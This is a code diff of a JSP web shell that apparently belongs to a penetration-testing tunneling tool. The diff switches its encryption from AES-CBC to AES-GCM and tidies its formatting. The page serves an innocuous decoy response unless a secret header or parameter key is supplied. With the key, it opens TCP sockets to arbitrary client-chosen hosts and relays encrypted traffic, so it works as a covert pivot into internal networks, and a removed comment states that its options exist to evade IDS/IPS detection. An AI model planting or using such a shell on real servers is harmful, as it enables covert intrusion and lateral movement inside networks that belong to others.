@@ -1,4 +1,5 @@
-<%@page import="java.io.*,java.net.*,java.util.*,sun.misc.BASE64Decoder,sun.misc.BASE64Encoder,javax.naming.*,javax.servlet.jsp.PageContext,java.security.*,javax.crypto.*,javax.crypto.spec.*"%><%!
+<%@page import="java.io.*,java.net.*,java.util.*,sun.misc.BASE64Decoder,sun.misc.BASE64Encoder,javax.naming.*,javax.servlet.jsp.PageContext,java.security.*,javax.crypto.*,javax.crypto.spec.*"%>
+<%!
 
 final public static char[] hexArray = "0123456789ABCDEF".toCharArray();
 
@@ -58,8 +59,7 @@ class SessionConnection
 	
 	public String GenerateConnectionID()
 	{	
-		Random r = new Random();
-		
+		Random r = new Random();		
 		byte[] connID = new byte[8];
 		
 		r.nextBytes(connID);
@@ -84,8 +84,7 @@ public byte[] hexStringToByteArray(String s) {
     int len = s.length();
     byte[] data = new byte[len / 2];
     for (int i = 0; i < len; i += 2) {
-        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
-                             + Character.digit(s.charAt(i+1), 16));
+        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i+1), 16));
     }
     return data;
 }
@@ -97,46 +96,46 @@ public byte[] GenerateRandomBytes(int byteCount)
 	return result;
 }
 
-public byte[] EncryptData(byte[] plainText, Cipher c, byte[] key, int blockSize) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+public byte[] EncryptData(byte[] plaintext, Cipher cipher, byte[] key) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 {
-	byte[] iv = GenerateRandomBytes(blockSize);
-	// typical AES encryption depends on the IV alone preventing identical inputs from 
-	// encrypting to identical outputs
-	// MIT Kerberos uses a model in which the IV is set to all zeroes, but the first 
-	// block of data is random, and then discarded on decryption
-	// I think of this as a "reinitialization vector" that takes place on the other 
-	// side of the encryption "looking glass". It should also help protect against 
-	// theoretical known-plaintext vulnerabilities in AES.
-	// why not use both? 
-	byte[] reIV = GenerateRandomBytes(blockSize);
-	SecretKey key2 = new SecretKeySpec(key, 0, key.length, "AES");
-	c.init(Cipher.ENCRYPT_MODE, key2, new IvParameterSpec(iv));
-	byte[] rivPlainText = new byte[plainText.length + blockSize];
-	System.arraycopy(reIV, 0, rivPlainText, 0, reIV.length);
-	System.arraycopy(plainText, 0, rivPlainText, blockSize, plainText.length);
-	byte[] cipherText = c.doFinal(rivPlainText);
-	byte[] ivCipherText = new byte[cipherText.length + blockSize];
-	System.arraycopy(iv, 0, ivCipherText, 0, iv.length);
-	System.arraycopy(cipherText, 0, ivCipherText, blockSize, cipherText.length);	
-	return ivCipherText;
+	byte[] nonce = new byte[16];
+	SecureRandom secureRandom = new SecureRandom();
+	secureRandom.nextBytes(nonce);
+	GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
+
+	SecretKey secretKey = new SecretKeySpec(key, 0, key.length, "AES");
+	cipher.init(Cipher.ENCRYPT_MODE, secretKey, gcmParameterSpec);
+
+	byte[] ciphertext = cipher.doFinal(plaintext);
+
+	// We need to sent nonce + data
+	byte[] data = new byte[ciphertext.length + (128 / Byte.SIZE)];
+	System.arraycopy(nonce, 0, data, 0, (128 / Byte.SIZE));
+	System.arraycopy(ciphertext, 0, data, (128 / Byte.SIZE), ciphertext.length);
+
+	return data;
 }
 
-public byte[] DecryptData(byte[] cipherText, Cipher c, byte[] key, int blockSize) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+public byte[] DecryptData(byte[] ciphertext, Cipher cipher, byte[] key) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 {
-	byte[] iv = new byte[blockSize];
-	byte[] strippedCipherText = new byte[cipherText.length - blockSize];
-	System.arraycopy(cipherText, 0, iv, 0, blockSize);
-	System.arraycopy(cipherText, blockSize, strippedCipherText, 0, strippedCipherText.length);
-	SecretKey key2 = new SecretKeySpec(key, 0, key.length, "AES");
-	c.init(Cipher.DECRYPT_MODE, key2, new IvParameterSpec(iv));
-	byte[] rivPlainText = c.doFinal(strippedCipherText);
-	byte[] plainText = new byte[rivPlainText.length - blockSize];
-	System.arraycopy(rivPlainText, blockSize, plainText, 0, plainText.length);
-	return plainText;
+	// We need to extract the nonce from data
+	byte[] nonce = new byte[16];
+	System.arraycopy(ciphertext, 0, nonce, 0, (128 / Byte.SIZE));
+	GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
+
+	byte[] data = new byte[ciphertext.length - (128 / Byte.SIZE)];
+	System.arraycopy(ciphertext, (128 / Byte.SIZE), data, 0, ciphertext.length - (128 / Byte.SIZE));
+
+	SecretKey secretKey = new SecretKeySpec(key, 0, key.length, "AES");
+	cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmParameterSpec);
+
+	byte[] decryptedText = cipher.doFinal(data);
+
+	return decryptedText;
 }
+%>
 
-%><%
-
+<%
 /* Begin configurable options */
 
 int serverSocketMaxUnusedIterations = |PLACEHOLDER_serverSocketMaxUnusedIterations|;
@@ -146,9 +145,6 @@ int serverSocketSendBufferSize = |PLACEHOLDER_serverSocketSendBufferSize|;
 int serverSocketReceiveBufferSize = |PLACEHOLDER_serverSocketReceiveBufferSize|;
 
 int serverToClientBlockSize = |PLACEHOLDER_serverToClientBlockSize|;
-
-/* Most of the options in this section are configurable to avoid simplistic string-based IDS/IPS-type detection */
-/* If they are altered, be sure to pass the corresponding alternate values to the Python client software */
 
 String headerValueKey = "|PLACEHOLDER_headerValueKey|";
 String encryptionKeyHex = "|PLACEHOLDER_encryptionKeyHex|";
@@ -215,62 +211,44 @@ int opMode = OPMODE_HIDE;
 
 int encryptionBlockSize = 16;
 
-/* response.setBufferSize(6553600); */
-
 byte[] encryptionKey = new byte[] {};
 
-try
-{
+try {
 	encryptionKey = hexStringToByteArray(encryptionKeyHex);
-}
-catch (Exception ex)
-{
+} catch (Exception ex) {
 	encryptionKey = new byte[] {};
 }
 
 Cipher cipher = null;
 
-try
-{
-	cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-}
-catch (Exception ex)
-{
+try {
+	cipher = Cipher.getInstance("AES/GCM/NoPadding");
+} catch (Exception ex) {
 	cipher = null;
 }
 
-
-try
-{
-	if (accessKeyMode.equals("header"))
-	{
-		if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim()))
-		{
+try {
+	if (accessKeyMode.equals("header")) {
+		if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim())) {
 			opMode = OPMODE_DEFAULT;
 		}
 	}
-	else
-	{
-		if (request.getParameter(paramNameAccessKey).toString().trim().equals(headerValueKey.trim()))
-		{
+	else {
+		if (request.getParameter(paramNameAccessKey).toString().trim().equals(headerValueKey.trim())) {
 			opMode = OPMODE_DEFAULT;
 		}
 	}
-}
-catch (Exception ex)
-{
+} catch (Exception ex) {
     opMode = OPMODE_HIDE;
 }
 %><%=responseStringPrefix%><%
-if (opMode == OPMODE_HIDE)
-{
+if (opMode == OPMODE_HIDE) {
 	/* Begin: replace this block of code with alternate JSP code to use a different "innocuous" default response */
 	/* E.g. copy/paste from your favourite server status page JSP */
     %><%=responseStringHide%><%
 	/* End: replace this block of code with alternate JSP code to use a different "innocuous" default response */
 }
-if (opMode != OPMODE_HIDE)
-{
+if (opMode != OPMODE_HIDE) {
 	PageContext context;
 	HttpSession currentSession;
 	int DestPort = -1;
@@ -287,256 +265,184 @@ if (opMode != OPMODE_HIDE)
 	
 	boolean validRequest = true;
 	
-	try
-	{
-		if ((request.getParameter(paramNameEncryptedBlock) != null) || (request.getParameter(paramNamePlaintextBlock) != null))
-		{
+	try {
+		if ((request.getParameter(paramNameEncryptedBlock) != null) || (request.getParameter(paramNamePlaintextBlock) != null)) {
 			byte[] decodedBytes = new byte[0];
-			if ((request.getParameter(paramNameEncryptedBlock) != null) && (cipher != null) && (encryptionKey.length > 0))
-			{
+			if ((request.getParameter(paramNameEncryptedBlock) != null) && (cipher != null) && (encryptionKey.length > 0)) {
 				decodedBytes = base64decoder.decodeBuffer(request.getParameter(paramNameEncryptedBlock));
-				try
-				{
-					byte[] decryptedBytes = DecryptData(decodedBytes, cipher, encryptionKey, encryptionBlockSize);
+				try {
+					byte[] decryptedBytes = DecryptData(decodedBytes, cipher, encryptionKey);
 					unpackedBlock = new String(decryptedBytes, "UTF-8");
 					encryptedRequest = true;
-				}
-				catch (Exception ex)
-				{
+				} catch (Exception ex) {
 					%><%=responseStringErrorDecryptFailed%><%
-					/* return; */
 					validRequest = false;
 					sentResponse = true;
 				}
 			}
-			else
-			{
+			else {
 				decodedBytes = base64decoder.decodeBuffer(request.getParameter(paramNamePlaintextBlock));
 				unpackedBlock = new String(decodedBytes, "UTF-8");
 			}
 			
-			if (validRequest)
-			{
+			if (validRequest) {
 				String[] paramArray = unpackedBlock.split(dataBlockParamSeparator);
-				if (paramArray.length > 0)
-				{
-					for (int i = 0; i < paramArray.length; i++)
-					{
+				if (paramArray.length > 0) {
+					for (int i = 0; i < paramArray.length; i++) {
 						String currentParam = paramArray[i];
 						String[] pvArray = currentParam.split(dataBlockNameValueSeparator);
-						if (pvArray.length > 1)
-						{
+						if (pvArray.length > 1) {
 							unpackedParams.put(pvArray[0], pvArray[1]);
 						}
 					}
 				}
 			}
 		}
-	}
-	catch (Exception ex)
-	{
+	} catch (Exception ex) {
 		validRequest = false;
 	}
 	
-	if (validRequest)
-	{		
-		try
-		{
-			if (unpackedParams.containsKey(paramNameOperation))
-			{
+	if (validRequest) {		
+		try {
+			if (unpackedParams.containsKey(paramNameOperation)) {
 				RequestedOp = (String)unpackedParams.get(paramNameOperation);
 			}
-		}
-		catch (Exception ex)
-		{
+		} catch (Exception ex) {
 			RequestedOp = "";
 		}
 		
-		try
-		{
-			if (unpackedParams.containsKey(paramNameDestinationHost))
-			{
+		try {
+			if (unpackedParams.containsKey(paramNameDestinationHost)) {
 				DestHost = (String)unpackedParams.get(paramNameDestinationHost);
 			}
-		}
-		catch (Exception ex)
-		{
+		} catch (Exception ex) {
 			DestHost = "";
 		}
 
-		try
-		{
-			if (unpackedParams.containsKey(paramNameConnectionID))
-			{
+		try {
+			if (unpackedParams.containsKey(paramNameConnectionID)) {
 				ConnectionID = (String)unpackedParams.get(paramNameConnectionID);
 			}
-		}
-		catch (Exception ex)
-		{
+		} catch (Exception ex) {
 			ConnectionID = "";
 		}
 		
-		try
-		{
-			if (unpackedParams.containsKey(paramNameDestinationPort))
-			{
+		try {
+			if (unpackedParams.containsKey(paramNameDestinationPort)) {
 				DestPort = (Integer.parseInt((String)unpackedParams.get(paramNameDestinationPort)));
 			}
-		}
-		catch (Exception ex)
-		{
+		} catch (Exception ex) {
 			DestPort = -1;
 		}
 		
-		try
-		{
-			if (unpackedParams.containsKey(paramNameData))
-			{
+		try {
+			if (unpackedParams.containsKey(paramNameData)) {
 				DataB64 = (String)unpackedParams.get(paramNameData);
 			}
-		}
-		catch (Exception ex)
-		{
+		} catch (Exception ex) {
 			DataB64 = "";
 		}
 		
-		if (RequestedOp.equals(""))
-		{
+		if (RequestedOp.equals("")) {
 			validRequest = false;
 		}
 	}
 	
-	if (validRequest)
-	{
-		if (RequestedOp.equals(opModeStringOpenConnection))
-		{
+	if (validRequest) {
+		if (RequestedOp.equals(opModeStringOpenConnection)) {
 			opMode = OPMODE_OPEN;
-			if (DestHost.equals(""))
-			{
+			if (DestHost.equals("")) {
 				validRequest = false;
 			}
-			if (DestPort == -1)
-			{
+			if (DestPort == -1) {
 				validRequest = false;
 			}
 		}
-		if (RequestedOp.equals(opModeStringSendReceive))
-		{
+		if (RequestedOp.equals(opModeStringSendReceive)) {
 			opMode = OPMODE_SEND_RECEIVE;
-			if (ConnectionID.equals(""))
-			{
+			if (ConnectionID.equals("")) {
 				validRequest = false;
 			}
 		}
-		if (RequestedOp.equals(opModeStringCloseConnection))
-		{
+		if (RequestedOp.equals(opModeStringCloseConnection)) {
 			opMode = OPMODE_CLOSE;
-			if (ConnectionID.equals(""))
-			{
+			if (ConnectionID.equals("")) {
 				validRequest = false;
 			}
 		}
 	}
 	
-	if (!validRequest)
-	{
-		if (!sentResponse)
-		{
+	if (!validRequest) {
+		if (!sentResponse) {
 			%><%=responseStringErrorInvalidRequest%><%
-			/* return; */
 		}
 	}
-	else
-	{
-		try
-		{
+	else {
+		try {
 			Connections = (Hashtable)session.getAttribute("SessionConnections");
-			if (Connections == null)
-			{
+			if (Connections == null) {
 				Connections = new Hashtable();
 			}
-		}
-		catch (Exception ex)
-		{
+		} catch (Exception ex) {
 			Connections = new Hashtable();
 		}
 		
-		if (opMode == OPMODE_OPEN)
-		{
+		if (opMode == OPMODE_OPEN) {
 			Conn = new SessionConnection();
 			Conn.Host = DestHost;
 			Conn.PortNumber = DestPort;
 			ConnectionID = Conn.ConnectionID;
-			try
-			{
+			try {
 				Conn.Sock = new Socket(DestHost, DestPort);
 				Conn.Sock.setSoTimeout(serverSocketIOTimeout);
 				Conn.Sock.setSendBufferSize(serverSocketSendBufferSize);
 				Conn.Sock.setReceiveBufferSize(serverSocketReceiveBufferSize);
-				/* Conn.Sock.setTcpNoDelay(true); */
 				Connections.put(ConnectionID, Conn);
 				%><%=responseStringConnectionCreated%> <%=ConnectionID%><%
 				sentResponse = true;
 			}
-			catch (Exception ex)
-			{
+			catch (Exception ex) {
 				%><%=responseStringErrorConnectionOpenFailed%><%
-				/* return; */
 				validRequest = false;
 				sentResponse = true;
 			}
 		}
 	}
 	
-	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE) || (opMode == OPMODE_CLOSE))
-	{
-		if (Connections.containsKey(ConnectionID))
-		{
-			try
-			{
+	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE) || (opMode == OPMODE_CLOSE)) {
+		if (Connections.containsKey(ConnectionID)) {
+			try {
 				Conn = (SessionConnection)Connections.get(ConnectionID);
-				if (Conn.Sock == null)
-				{
+				if (Conn.Sock == null) {
 					validRequest = false;
 					Connections.remove(ConnectionID);
 				}
-			}
-			catch (Exception ex)
-			{
+			} catch (Exception ex) {
 				validRequest = false;
 			}
 		}
-		else
-		{
+		else {
 			validRequest = false;
 		}
 		
-		if (!validRequest)
-		{
-			if (!sentResponse)
-			{
+		if (!validRequest) {
+			if (!sentResponse) {
 				%><%=responseStringErrorConnectionNotFound%><%
-				/* return; */
 				validRequest = false;
 				sentResponse = true;
 			}
 		}
 	}
 
-	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE))
-	{
+	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE)) {
 		InputStream is = null;
-		try
-		{
+		try {
 			is = Conn.Sock.getInputStream();
-		}
-		catch (Exception ex)
-		{
+		} catch (Exception ex) {
 			Conn.Sock = new Socket(DestHost, DestPort);
 			Conn.Sock.setSoTimeout(serverSocketIOTimeout);
 			Conn.Sock.setSendBufferSize(serverSocketSendBufferSize);
 			Conn.Sock.setReceiveBufferSize(serverSocketReceiveBufferSize);
-			/* Conn.Sock.setTcpNoDelay(true); */
 			is = Conn.Sock.getInputStream();
 		}
 		DataInputStream inStream = new DataInputStream(is);
@@ -546,198 +452,149 @@ if (opMode != OPMODE_HIDE)
 		
 		boolean socketStillOpen = true;
 		
-		try
-		{
+		try {
 			outStream.write(bytesOut);
 			outStream.flush();
-		}
-		catch (Exception ex)
-		{
+		} catch (Exception ex) {
 			socketStillOpen = false;
 			opMode = OPMODE_CLOSE;
 		}
 		
 		byte[] bytesIn = new byte[0];
 		
-		if (socketStillOpen)
-		{
+		if (socketStillOpen) {
 			byte[] buf = new byte[6553600];
 			int maxReadAttempts = 65536000;
 			maxReadAttempts = 1000;
 			int readAttempts = 0;
 			int nRead = 0;
 			boolean doneReading = false;
-			try
-			{
+
+			try {
 				nRead = inStream.read(buf);
-				if (nRead < 0)
-				{
+				if (nRead < 0) {
 					doneReading = true;
 				}
-			}
-			catch (Exception ex)
-			{
+			} catch (Exception ex) {
 				doneReading = true;
 			}
-			while (!doneReading)
-			{
+
+			while (!doneReading) {
 				byte[] newBytesIn = new byte[bytesIn.length + nRead];
-				if (bytesIn.length > 0)
-				{
+				if (bytesIn.length > 0) {
 					System.arraycopy(bytesIn, 0, newBytesIn, 0, bytesIn.length);
 				}
-				if (nRead > 0)
-				{
+				if (nRead > 0) {
 					System.arraycopy(buf, 0, newBytesIn, bytesIn.length, nRead);
 					bytesIn = newBytesIn;
 				}
-				try
-				{
+				try {
 					nRead = inStream.read(buf);
-					if (nRead < 0)
-					{
+					if (nRead < 0) {
 						doneReading = true;
 					}
-				}
-				catch (Exception ex)
-				{
+				} catch (Exception ex) {
 					doneReading = true;
 				}
 				readAttempts++;
-				if (readAttempts > maxReadAttempts)
-				{
+				if (readAttempts > maxReadAttempts) {
 					doneReading = true;
 				}
 			}
 			
-			synchronized(session)
-			{
+			synchronized(session) {
 				Conn.AddBytesToReceiveBuffer(bytesIn);
 			}
 		}
 		
-		if (Conn.ReceiveBuffer.length > 0)
-		{
+		if (Conn.ReceiveBuffer.length > 0) {
 			String OutB64 = "";
 			BASE64Encoder base64encoder = new BASE64Encoder();
 			byte[] toClient = new byte[0];
-			synchronized(session)
-			{
+			synchronized(session) {
 				toClient = Conn.GetBytesFromReceiveBuffer(serverToClientBlockSize);
 			}
-			if (encryptedRequest)
-			{
-				try
-				{
-					byte[] encryptedBytes = EncryptData(toClient, cipher, encryptionKey, encryptionBlockSize);
+			if (encryptedRequest) {
+				try {
+					byte[] encryptedBytes = EncryptData(toClient, cipher, encryptionKey);
 					OutB64 = base64encoder.encode(encryptedBytes);
-				}
-				catch (Exception ex)
-				{
+				} catch (Exception ex) {
 					%><%=responseStringErrorEncryptFailed%><%
-					/* return; */
 					validRequest = false;
 					sentResponse = true;
 				}
 			}
-			else
-			{
+			else {
 				OutB64 = base64encoder.encode(toClient);
 			}
-			if (!sentResponse)
-			{
+
+			if (!sentResponse) {
 				%><%=responseStringData%> <%=OutB64%><%
 				sentResponse = true;
 			}
 		}
-		else
-		{
-			if (!sentResponse)
-			{
+		else {
+			if (!sentResponse) {
 				%><%=responseStringNoData%><%
 				sentResponse = true;
 			}
 		}
 	}
 	
-	if ((validRequest) && (opMode == OPMODE_CLOSE))
-	{
-		try
-		{
+	if ((validRequest) && (opMode == OPMODE_CLOSE)) {
+		try {
 			Conn.Sock.close();
-			if (!sentResponse)
-			{
+			if (!sentResponse) {
 				%><%=responseStringConnectionClosed%> <%=ConnectionID%><%
 				sentResponse = true;
 			}
-		}
-		catch (Exception ex)
-		{
-			if (!sentResponse)
-			{
+		} catch (Exception ex) {
+			if (!sentResponse) {
 				%><%=responseStringErrorConnectionCloseFailed%><%
 				sentResponse = true;
 			}
 		}
 	}
 	
-	if (validRequest)
-	{	
-		synchronized(session)
-		{
-			try
-			{
+	if (validRequest) {	
+		synchronized(session) {
+			try {
 				Connections = (Hashtable)session.getAttribute("SessionConnections");
-				if (Connections == null)
-				{
+				if (Connections == null) {
 					Connections = new Hashtable();
 				}
-			}
-			catch (Exception ex)
-			{
+			} catch (Exception ex) {
 				Connections = new Hashtable();
 			}
 			
-			/* Update the current connection (if one exists), and remove stale connections */
-			
-			if (!ConnectionID.equals(""))
-			{
+			/* Update the current connection (if one exists), and remove stale connections */		
+			if (!ConnectionID.equals("")) {
 				Conn.UnusedIterations = 0;
-				if (Connections.containsKey(ConnectionID))
-				{
+				if (Connections.containsKey(ConnectionID)) {
 					Connections.remove(ConnectionID);
-					if (opMode != OPMODE_CLOSE)
-					{
+					if (opMode != OPMODE_CLOSE) {
 						Connections.put(ConnectionID, Conn);
 					}
 				}
-				else
-				{
+				else {
 					Connections.put(ConnectionID, Conn);
 				}
 			}
 			
 			Enumeration connKeys = Connections.keys();
-			while (connKeys.hasMoreElements())
-			{
+			while (connKeys.hasMoreElements()) {
 				String cid = (String)connKeys.nextElement();
-				if (!cid.equals(ConnectionID))
-				{
+				if (!cid.equals(ConnectionID)) {
 					SessionConnection c = (SessionConnection)Connections.get(cid);
 					Connections.remove(cid);
 					c.UnusedIterations++;
-					if (c.UnusedIterations < serverSocketMaxUnusedIterations)
-					{
+					if (c.UnusedIterations < serverSocketMaxUnusedIterations) {
 						Connections.put(cid, c);
 					}
-					else
-					{
-						try
-						{
+					else {
+						try {
 							c.Sock.close();
-						}
-						catch (Exception ex)
-						{
+						} catch (Exception ex) {
 							// do nothing
 						}
 					}
